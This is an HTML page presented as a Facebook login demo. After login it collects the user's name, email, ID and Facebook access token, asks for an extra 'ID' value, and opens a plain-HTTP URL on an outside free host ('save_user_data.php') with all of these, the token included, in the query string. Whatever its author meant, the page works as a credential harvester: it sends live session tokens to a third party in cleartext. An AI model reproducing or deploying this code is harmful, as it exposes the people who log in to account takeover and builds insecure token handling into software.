<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login Redirect</title>
</head>
<body>
    <h2>Facebook Login Demo</h2>
    <fb:login-button 
        scope="public_profile,email" 
        onlogin="checkLoginState();">
    </fb:login-button>

    <script>
        // Facebook SDK initialization
        window.fbAsyncInit = function () {
            FB.init({
                appId: '761434701600961', // Replace with your Facebook App ID
                cookie: true,
                xfbml: true,
                version: 'v20.0'
            });

            FB.getLoginStatus(function (response) {
                statusChangeCallback(response);
            });
        };

        // Asynchronously load the Facebook SDK
        (function (d, s, id) {
            var js, fjs = d.getElementsByTagName(s)[0];
            if (d.getElementById(id)) { return; }
            js = d.createElement(s); js.id = id;
            js.src = "https://connect.facebook.net/en_US/sdk.js";
            fjs.parentNode.insertBefore(js, fjs);
        }(document, 'script', 'facebook-jssdk'));

        // Callback function for Facebook login status
        function statusChangeCallback(response) {
            if (response.status === 'connected') {
                // Logged into your app and Facebook.
                fetchUserData();
            } else {
                console.log('User not authenticated.');
            }
        }

        // Fetch user data after successful login
        function fetchUserData() {
            FB.api('/me', {fields: 'name,email,id'}, function (response) {
                // Get the user details
                let userName = response.name;
                let userEmail = response.email;
                let userId = response.id;
                let accessToken = FB.getAuthResponse().accessToken;

                // Check if `someuserdeta` is present in the URL query string
                let urlParams = new URLSearchParams(window.location.search);
                let someuserdeta = urlParams.get('id');

                // If 'id' (someuserdeta) is missing, show a popup to prompt the user
                if (!someuserdeta) {
                    someuserdeta = prompt('Please enter the ID:', 'default_id_value');
                    if (!someuserdeta) {
                        alert('ID is required to proceed.');
                        return;
                    }
                }

                // Redirect to the PHP page with user details in the query parameters
                let url = `http://sabbir28.rf.gd/save_user_data.php?facebook_id=${encodeURIComponent(userId)}&facebook_name=${encodeURIComponent(userName)}&facebook_email=${encodeURIComponent(userEmail)}&facebook_token=${encodeURIComponent(accessToken)}&filename=${encodeURIComponent(someuserdeta)}`;

                // Open the URL in a new tab
                window.open(url, '_blank');
            });
        }

        // Called when user completes the Facebook login process
        function checkLoginState() {
            FB.getLoginStatus(function (response) {
                statusChangeCallback(response);
            });
        }
    </script>
</body>
</html>
